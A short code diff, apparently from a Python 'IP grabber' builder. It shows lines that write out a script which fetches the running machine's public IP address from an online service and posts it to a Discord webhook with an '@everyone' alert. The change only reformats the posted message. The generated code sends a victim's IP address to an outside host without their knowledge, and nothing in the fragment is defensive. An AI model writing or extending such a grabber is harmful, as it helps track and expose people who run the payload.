@@ -52,7 +52,7 @@ try:
     file.write('url = "https://api.ipify.org"\n')
     file.write("r = requests.get(url).text\n")
     file.write("r = str(r)\n")
-    file.write('requests.post(webhook, json={"content": f"@everyone Ip: {r}"})')
+    file.write('requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})')
     file.close()
 except:
     print("Unkown Error")
